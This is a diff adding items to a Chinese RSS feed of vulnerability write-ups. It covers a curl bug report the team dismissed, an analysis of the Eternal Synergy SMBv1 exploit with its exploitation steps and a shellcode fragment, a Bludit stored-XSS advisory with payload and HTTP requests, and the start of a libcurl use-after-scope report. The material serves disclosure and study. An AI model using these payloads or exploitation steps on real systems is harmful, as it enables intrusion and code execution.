@@ -7,7 +7,585 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>qife</copyright>
-        <lastBuildDate>Sun, 03 Aug 2025 09:39:47 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 04 Aug 2025 21:19:00 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>关于允许程序性剔除随机值的安全隐患分析</title>
+        <link>http://localhost:1313/p/%E5%85%B3%E4%BA%8E%E5%85%81%E8%AE%B8%E7%A8%8B%E5%BA%8F%E6%80%A7%E5%89%94%E9%99%A4%E9%9A%8F%E6%9C%BA%E5%80%BC%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3%E5%88%86%E6%9E%90/</link>
+        <pubDate>Mon, 04 Aug 2025 21:19:00 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E5%85%B3%E4%BA%8E%E5%85%81%E8%AE%B8%E7%A8%8B%E5%BA%8F%E6%80%A7%E5%89%94%E9%99%A4%E9%9A%8F%E6%9C%BA%E5%80%BC%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;关于允许程序性剔除随机值的安全隐患分析&#34;&gt;关于允许程序性剔除随机值的安全隐患分析
+&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;报告编号：#3262848&lt;/strong&gt;&lt;br&gt;
+&lt;strong&gt;提交者：lyb_unaffiliated&lt;/strong&gt;&lt;br&gt;
+&lt;strong&gt;提交时间：2025年7月21日&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;报告正文&#34;&gt;报告正文
+&lt;/h2&gt;&lt;p&gt;尊敬的团队：&lt;br&gt;
+我是Lorentso Youriévitch Bogdanov。我注意到贵项目需要更高质量的代码审查。近期合格黑客的短缺和江湖骗子的涌现并非偶然，这在某种程度上是由法律和技术环境共同造成的。&lt;/p&gt;
+&lt;p&gt;虽然我无法提供具体解决方案（这很可能违反我的独家合约），但我仍决定提交此报告，并自愿放弃任何漏洞赏金。&lt;/p&gt;
+&lt;p&gt;在初步代码审查中，我发现了一个特殊的&amp;quot;漏洞&amp;quot;（请原谅这个带引号的表述）。大多数人不会称之为漏洞，您最近可能也对这个词产生了怀疑。当我们开始质疑曾经依赖的术语时，问题就已经出现了。&lt;/p&gt;
+&lt;p&gt;起初这看起来并不严重。对于如此规模的项目，一定程度的数据偏移是正常的，大多数人不会关注随机数据流——即使它是无意识产生的所谓&amp;quot;溢出&amp;quot;或&amp;quot;垃圾代码&amp;quot;。人们常用&amp;quot;统计安全性&amp;quot;来为忽略小风险辩护，这种猴子与打字机的比喻确实有道理。随机数据偏移在实际程序生命周期中造成的危险几乎为零。&lt;/p&gt;
+&lt;p&gt;但当我转向理论研究时发现：如果&amp;quot;随机&amp;quot;垃圾代码能够剔除重复值，只产生新的唯一结果会怎样？在贵架构中，这出奇地简单。任何获得足够权限的向量都可以将组合的内部寄存器与相关框架耦合，并实时更新。虽然存储压力会空前巨大，但通过剔除重复值变得可行。&lt;/p&gt;
+&lt;p&gt;根据保守的时钟速度和运行时间假设，我估计每小时仅需几GB存储空间（远低于预期）。即使有千倍的误差范围，您能及时发现吗？目前显然没有自动化措施能防止这种方法。&lt;/p&gt;
+&lt;h2 id=&#34;影响分析&#34;&gt;影响分析
+&lt;/h2&gt;&lt;p&gt;现在我们知道了问题所在，唯一剩下的问题是&amp;quot;何时发生&amp;quot;。要回答这个问题需要做出太多不可靠的假设。我建议您认真对待此事——正是因为这些特殊环境。回顾计算史和人类历史，您会发现大量由当时被认为是理论性或完全未知的问题造成的灾难。直到最近我们才获得在灾难发生前科学应对的能力。这是一种特权而非权利，我们不应滥用它。&lt;/p&gt;
+&lt;p&gt;-LYB&lt;/p&gt;
+&lt;h2 id=&#34;项目方回复&#34;&gt;项目方回复
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;bagder (cURL团队成员)&lt;/strong&gt; 评论：&lt;br&gt;
+&amp;ldquo;我没有看到具体问题提到？&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;jimfuller2024 (cURL团队成员)&lt;/strong&gt; 评论：&lt;br&gt;
+&amp;ldquo;唉&amp;hellip;HackerOne&amp;hellip;你们在听吗？这显然是错误报告，完全浪费时间。&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;bagder&lt;/strong&gt; 将报告状态改为&amp;quot;不适用&amp;quot;并关闭：&lt;br&gt;
+&amp;ldquo;不是安全问题&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;bagder&lt;/strong&gt; 请求公开此报告：&lt;br&gt;
+&amp;ldquo;根据项目透明度政策，我们希望所有报告都被公开。&amp;rdquo;&lt;/p&gt;
+&lt;h2 id=&#34;报告元数据&#34;&gt;报告元数据
+&lt;/h2&gt;&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;字段&lt;/th&gt;
+          &lt;th&gt;内容&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;报告ID&lt;/td&gt;
+          &lt;td&gt;#3262848&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;严重程度&lt;/td&gt;
+          &lt;td&gt;低 (0.1 ~ 3.9)&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;披露时间&lt;/td&gt;
+          &lt;td&gt;2025年7月22日 UTC时间上午8:38&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;弱点类型&lt;/td&gt;
+          &lt;td&gt;使用不足够的随机值&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;CVE ID&lt;/td&gt;
+          &lt;td&gt;无&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;赏金&lt;/td&gt;
+          &lt;td&gt;无&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+</description>
+        </item>
+        <item>
+        <title>Eternal Synergy漏洞分析：SMBv1认证漏洞的深度剖析</title>
+        <link>http://localhost:1313/p/eternal-synergy%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90smbv1%E8%AE%A4%E8%AF%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90/</link>
+        <pubDate>Mon, 04 Aug 2025 15:41:09 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/eternal-synergy%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90smbv1%E8%AE%A4%E8%AF%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90/</guid>
+        <description>&lt;h2 id=&#34;漏洞背景&#34;&gt;漏洞背景
+&lt;/h2&gt;&lt;p&gt;2017年4月ShadowBrokers泄露的Eternal Synergy是利用SMBv1协议认证漏洞（CVE-2017-0143）的攻击工具，该漏洞影响Windows 8及以下系统，微软在MS17-010补丁中修复。与常规漏洞不同，该漏洞主要通过数据包层面的操作实现利用。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞原理&#34;&gt;漏洞原理
+&lt;/h2&gt;&lt;p&gt;核心问题在于SMB协议处理TRANSACTION时未严格校验消息类型：当存在SMB_COM_WRITE_ANDX事务时，若后续收到MID等于该事务FID的SMB_COM_TRANSACTION_SECONDARY消息，系统会错误地将后者纳入当前事务。由于WRITE_ANDX会动态更新InData指针（指向缓冲区末尾），而TRANSACTION_SECONDARY直接使用该指针写入数据，导致缓冲区越界写入。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// srv.sys中的关键判断逻辑
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Header&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SMB_COM_WRITE_ANDX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;targetOtherInfo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Fid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// WRITE_ANDX使用FID作为标识
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;targetOtherInfo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;SmbGetAlignedUshort&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Header&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Mid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 其他消息使用MID
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;利用技术&#34;&gt;利用技术
+&lt;/h2&gt;&lt;h3 id=&#34;1-事务劫持&#34;&gt;1. 事务劫持
+&lt;/h3&gt;&lt;p&gt;攻击者通过以下步骤控制事务结构：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;创建常规TRANSACTION作为控制事务（InData=0xfffff8a00167f110）&lt;/li&gt;
+&lt;li&gt;发送特制WRITE_ANDX消息使InData偏移0x200字节（变为0xfffff8a00167f310）&lt;/li&gt;
+&lt;li&gt;通过TRANSACTION_SECONDARY消息（dataDisplacement=0x5020）覆盖相邻事务的OtherInfo字段&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;2-内存读写原语&#34;&gt;2. 内存读写原语
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;写原语&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;劫持受害事务的InData指针指向目标地址&lt;/li&gt;
+&lt;li&gt;发送数据包时，内核会将包内容写入被篡改的地址&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;读原语&lt;/strong&gt;：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;修改受害事务的OutData指针（偏移0x88）&lt;/li&gt;
+&lt;li&gt;设置关键字段：SetupCount=4, MaxSetupCount=0, MaxDataCount=0x20000&lt;/li&gt;
+&lt;li&gt;触发事务响应时，内核会将目标内存内容通过SMB响应返回&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;3-代码执行&#34;&gt;3. 代码执行
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;泄露srv!SrvTransaction2DispatchTable地址&lt;/li&gt;
+&lt;li&gt;覆盖TRANS2_SESSION_SETUP处理函数指针（dispatchTable[0xe]）&lt;/li&gt;
+&lt;li&gt;发送TRANSACTION2消息触发shellcode执行&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;现代系统防护&#34;&gt;现代系统防护
+&lt;/h2&gt;&lt;p&gt;该漏洞利用技术受以下防护机制制约：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;HVCI&lt;/strong&gt;：阻止执行未签名内核代码&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;CFG&lt;/strong&gt;：防止通过篡改函数指针劫持控制流&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;技术亮点&#34;&gt;技术亮点
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;纯数据包层面的漏洞利用，无需本地shellcode&lt;/li&gt;
+&lt;li&gt;通过事务结构泄露实现内核地址嗅探&lt;/li&gt;
+&lt;li&gt;利用ntoskrnl.exe的RWX段（0x271000偏移处）作为暂存区&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;; 攻击使用的shellcode片段
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mov rax,qword ptr gs:[20h]  ; 获取_KPRCB
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;add rax,8B0h                ; 定位PPNxPagedLookasideList
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;call qword ptr [rax]         ; 调用nt!ExAllocatePoolWithTag
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;结论&#34;&gt;结论
+&lt;/h2&gt;&lt;p&gt;Eternal Synergy展示了协议状态机漏洞的复杂利用方式，其创新性的纯数据包攻击模式为后续SMB协议安全设计提供了重要参考。微软通过增强事务验证机制和引入硬件级防护有效遏制了此类攻击。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Bludit v3.16.2存储型XSS漏洞分析：通过&#34;添加新内容&#34;功能实现攻击</title>
+        <link>http://localhost:1313/p/bludit-v3.16.2%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E6%96%B0%E5%86%85%E5%AE%B9%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0%E6%94%BB%E5%87%BB/</link>
+        <pubDate>Mon, 04 Aug 2025 14:01:23 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/bludit-v3.16.2%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E6%96%B0%E5%86%85%E5%AE%B9%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0%E6%94%BB%E5%87%BB/</guid>
+        <description>&lt;h1 id=&#34;漏洞标题bludit-v3162添加新内容功能存储型xss漏洞&#34;&gt;漏洞标题：Bludit v3.16.2&amp;quot;添加新内容&amp;quot;功能存储型XSS漏洞
+&lt;/h1&gt;&lt;h1 id=&#34;日期2025年7月&#34;&gt;日期：2025年7月
+&lt;/h1&gt;&lt;h1 id=&#34;漏洞作者andrey-stoykov&#34;&gt;漏洞作者：Andrey Stoykov
+&lt;/h1&gt;&lt;h1 id=&#34;版本3162&#34;&gt;版本：3.16.2
+&lt;/h1&gt;&lt;h1 id=&#34;测试环境debian-12&#34;&gt;测试环境：Debian 12
+&lt;/h1&gt;&lt;h1 id=&#34;博客httpsmsecureltdblogspotcom&#34;&gt;博客：https://msecureltd.blogspot.com/
+&lt;/h1&gt;&lt;p&gt;存储型XSS&amp;quot;添加新内容&amp;quot;功能漏洞#1：&lt;/p&gt;
+&lt;p&gt;复现步骤：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;使用管理员账户登录并访问&amp;quot;新建内容&amp;quot;&lt;/li&gt;
+&lt;li&gt;在&amp;quot;源代码&amp;quot;字段输入以下参数
+&amp;ldquo;&lt;iframe&gt;&lt;textarea&gt;&lt;/iframe&gt;&lt;img src=&#34;&#34; onerror=&#34;alert(document.domain)&#34;&gt;&amp;rdquo;&lt;/li&gt;
+&lt;li&gt;点击&amp;quot;预览&amp;quot;时XSS载荷将被触发&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;// 添加新内容的HTTP POST请求&lt;/p&gt;
+&lt;p&gt;POST /bludit/admin/new-content HTTP/1.1
+Host: 192.168.58.133
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0)
+Gecko/20100101 Firefox/140.0
+[&amp;hellip;]&lt;/p&gt;
+&lt;p&gt;tokenCSRF=03a860fcc567fed86f6cb57e5877a469ef27e2ac&amp;amp;uuid=b219c568827ee49d5b8be839d6ab1043&amp;amp;type=published&amp;amp;coverImage=&amp;amp;content=&lt;iframe&gt;&lt;textarea&gt;&lt;/iframe&gt;&amp;lt;img+src%3d&amp;quot;&amp;quot;+onerror%3d&amp;quot;alert(document.domain)&amp;quot;&amp;gt;&amp;amp;category=&amp;amp;description=&amp;amp;date=2025-06-04+15%3A15%3A17&amp;amp;typeSelector=published&amp;amp;position=3&amp;amp;tags=&amp;amp;template=&amp;amp;externalCoverImage=&amp;amp;slug=xss&amp;amp;noindex=0&amp;amp;nofollow=0&amp;amp;noarchive=0&amp;amp;title=xss&lt;/p&gt;
+&lt;p&gt;// HTTP响应&lt;/p&gt;
+&lt;p&gt;HTTP/1.1 301 Moved Permanently
+Date: Wed, 04 Jun 2025 19:16:04 GMT
+Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
+Perl/v5.16.3
+X-Powered-By: Bludit
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+Pragma: no-cache
+Location: /bludit/admin/content
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8&lt;/p&gt;
+&lt;p&gt;// 触发XSS的HTTP GET请求&lt;/p&gt;
+&lt;p&gt;GET /bludit/admin/edit-content/xss HTTP/1.1
+Host: 192.168.58.133
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0)
+Gecko/20100101 Firefox/140.0
+[&amp;hellip;]&lt;/p&gt;
+&lt;p&gt;// HTTP响应&lt;/p&gt;
+&lt;p&gt;HTTP/1.0 200 OK
+Date: Wed, 04 Jun 2025 19:16:06 GMT
+Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
+Perl/v5.16.3
+X-Powered-By: Bludit
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+Pragma: no-cache
+Connection: close
+Content-Type: text/html; charset=UTF-8&lt;/p&gt;
+&lt;p&gt;[&amp;hellip;]&lt;/p&gt;
+&lt;!-- 编辑器 --&gt;
+&lt;textarea id=&#34;jseditor&#34; class=&#34;editable h-100&#34;
+style=&#34;&#34;&gt;&lt;iframe&gt;&lt;textarea&gt;&lt;/iframe&gt;&lt;img+src%3d&#34;&#34;+onerror%3d&#34;alert(document.domain)&#34;&gt;
+[...]</description>
+        </item>
+        <item>
+        <title>libcurl HTTP/3 POST请求处理中的栈释放后使用漏洞分析</title>
+        <link>http://localhost:1313/p/libcurl-http/3-post%E8%AF%B7%E6%B1%82%E5%A4%84%E7%90%86%E4%B8%AD%E7%9A%84%E6%A0%88%E9%87%8A%E6%94%BE%E5%90%8E%E4%BD%BF%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+        <pubDate>Mon, 04 Aug 2025 00:21:29 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/libcurl-http/3-post%E8%AF%B7%E6%B1%82%E5%A4%84%E7%90%86%E4%B8%AD%E7%9A%84%E6%A0%88%E9%87%8A%E6%94%BE%E5%90%8E%E4%BD%BF%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;stack-use-after-scope-in-http3-post-request-processing-via-curlopt_postfields&#34;&gt;Stack use-after-scope in HTTP/3 POST request processing via CURLOPT_POSTFIELDS
+&lt;/h1&gt;&lt;h2 id=&#34;摘要&#34;&gt;摘要
+&lt;/h2&gt;&lt;p&gt;libcurl的HTTP/3请求处理在使用CURLOPT_POSTFIELDS与栈分配缓冲区时存在栈释放后使用漏洞。libcurl保留了用户提供的POST数据指针，但在原始栈帧销毁后仍访问该指针，导致内存损坏和潜在拒绝服务。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞详情&#34;&gt;漏洞详情
+&lt;/h2&gt;&lt;p&gt;该漏洞发生在transfer.c:569的Curl_pretransfer()中，当libcurl对先前存储的POST数据指针（现在指向无效栈内存）调用strlen()时触发。&lt;/p&gt;
+&lt;h2 id=&#34;复现步骤概念验证&#34;&gt;复现步骤/概念验证
+&lt;/h2&gt;&lt;h3 id=&#34;环境&#34;&gt;环境
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;libcurl版本: 8.16.0-DEV (master分支)&lt;/li&gt;
+&lt;li&gt;编译器: Clang 20.1.8 with AddressSanitizer&lt;/li&gt;
+&lt;li&gt;平台: macOS (ARM64)&lt;/li&gt;
+&lt;li&gt;配置: 启用HTTP/3 (ngtcp2/nghttp3)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;复现步骤&#34;&gt;复现步骤
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;使用ASAN构建libcurl:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;CC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;clang
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;CFLAGS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-O1 -g -fsanitize=address,undefined&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./configure --with-openssl --with-nghttp2 --with-nghttp3 --with-ngtcp2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;编译POC代码:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// http3_crash_poc.c
